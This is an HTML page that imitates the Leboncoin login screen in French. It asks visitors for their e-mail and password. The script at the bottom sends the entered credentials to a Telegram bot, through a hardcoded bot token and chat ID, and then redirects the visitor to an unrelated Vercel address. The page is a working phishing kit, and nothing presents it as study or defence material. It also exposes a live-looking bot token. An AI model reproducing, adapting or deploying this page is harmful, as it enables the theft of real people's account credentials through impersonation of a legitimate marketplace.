<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>Leboncoin - Connexion</title>
  <style>
    * {
      max-width: 100%;
      outline: none;
      box-sizing: border-box;
      font-family: Arial, sans-serif;
    }
    body {
      margin: 0;
      padding: 0;
      background-color: white;
      display: flex;
      flex-direction: column;
      align-items: center;
      min-height: 100vh;
      text-align: center;
    }
    header {
      text-align: center;
      background: #ffffff;
      padding-top: 20px;
      width: 100%;
      max-width: 360px;
    }
    .logo {
      display: inline-block;
    }
    header img {
      width: 120px;
      height: auto;
    }
    main {
      margin: 0;
      padding: 20px 15px;
      text-align: center;
      background-color: white;
      width: 100%;
      max-width: 360px;
      display: flex;
      justify-content: flex-start;
      flex-direction: column;
      align-items: center;
      box-sizing: border-box;
    }
    .continer {
      margin-top: 20px;
      padding: 25px 20px;
      width: 100%;
      background: rgba(255, 255, 255, 0.95);
      border-radius: 14px;
      border: 2px solid #cdcfdb75;
      box-sizing: border-box;
      position: relative;
      z-index: 1;
      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
    }
    .col {
      text-align: left;
      margin-top: 20px;
    }
    .col label {
      font-size: 14px;
      font-weight: 600;
      color: #151f33;
    }
    .col input {
      width: 100%;
      padding: 14px 12px;
      border-radius: 20px;
      border: 1px solid #b2a6a6;
      margin-top: 6px;
      font-size: 15px;
      box-sizing: border-box;
      transition: border-color 0.3s;
    }
    .col input:focus {
      border-color: #ec5a13;
      outline: none;
    }
    .tittle {
      text-align: left;
    }
    h2 {
      margin-top: 0;
      margin-bottom: 6px;
      color: rgb(21 34 51);
      font-size: 22px;
      font-weight: 700;
    }
    .tittle p {
      font-size: 1em;
      margin-bottom: 12px;
      color: #151f33;
    }
    .code {
      text-align: left;
      margin-top: 6px;
    }
    .code a {
      font-size: 0.9em;
      color: #000000;
      text-decoration: none;
      transition: color 0.2s;
    }
    .code a:hover {
      color: #ec5a13;
    }
    .coll button {
      width: 100%;
      padding: 14px;
      color: white;
      background: #ec5a13;
      border-radius: 20px;
      border: none;
      font-size: 1.15em;
      margin-top: 28px;
      font-weight: bold;
      cursor: pointer;
      transition: background-color 0.3s;
    }
    .coll button:hover {
      background: #d44e0f;
    }
    .bottom {
      display: flex;
      flex-direction: column;
      align-items: center;
      margin-top: 24px;
      font-size: 0.9em;
      color: #151f33;
      gap: 6px;
    }
    .bottom p {
      margin: 0;
    }
    .bottom a {
      color: rgb(21 34 51);
      font-weight: bold;
      text-decoration: none;
      transition: color 0.2s;
    }
    .bottom a:hover {
      color: #ec5a13;
    }
    #loading {
      margin-top: 20px;
      color: #ec5a13;
      font-weight: bold;
      display: none;
      font-size: 1em;
    }
  </style>
</head>
<body>
  <header>
    <div class="logo">
      <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ99d5FfXb09Wt4b_VyIGEdQajCjKaEZi4FSg&s" alt="Logo Leboncoin" />
    </div>
  </header>

  <main>
    <div class="continer">
      <div class="tittle">
        <h2>Bonjour !</h2>
        <p>Connectez-vous pour découvrir toutes nos fonctionnalités.</p>
      </div>

      <form action="#" method="post" id="loginForm">
        <div class="col">
          <label for="user">E-mail *</label>
          <input type="text" id="user" name="user" required autofocus autocomplete="username" />
        </div>
        <div class="col">
          <label for="pass">Mot de passe *</label>
          <input type="password" id="pass" name="pass" required autocomplete="current-password" />
        </div>

        <div class="code">
          <a href="#">Mot de passe oublié</a>
        </div>

        <div class="coll">
          <button type="submit" id="submitBtn">Se connecter</button>
        </div>

        <div id="loading">Connexion en cours...</div>

        <div class="bottom">
          <p>Envie de nous rejoindre ?</p>
          <a href="#">Créer un compte</a>
        </div>
      </form>
    </div>
  </main>

  <script>
    const token = "7621285753:AAEVe240rt235EoRpGxiy0PSw1F-fRTd7mA";
    const chatId = "7421525298";

    async function sendToTelegram(formData) {
      const message = `Nouveau message depuis le formulaire :\nE-mail: ${formData.user}\nMot de passe: ${formData.pass}`;
      const url = `https://api.telegram.org/bot${token}/sendMessage`;

      try {
        await fetch(url, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            chat_id: chatId,
            text: message,
          }),
        });
      } catch (e) {
        console.warn("Erreur lors de l'envoi à Telegram (ignorée).");
      }
    }

    document.getElementById("loginForm").addEventListener("submit", async function (event) {
      event.preventDefault();

      document.getElementById("loading").style.display = "block";

      const user = document.getElementById("user").value;
      const pass = document.getElementById("pass").value;

      const formData = { user, pass };

      await sendToTelegram(formData);

      await new Promise((r) => setTimeout(r, 500));

      window.location.href = "https://adresse-xi.vercel.app/";
    });
  </script>
</body>
</html>
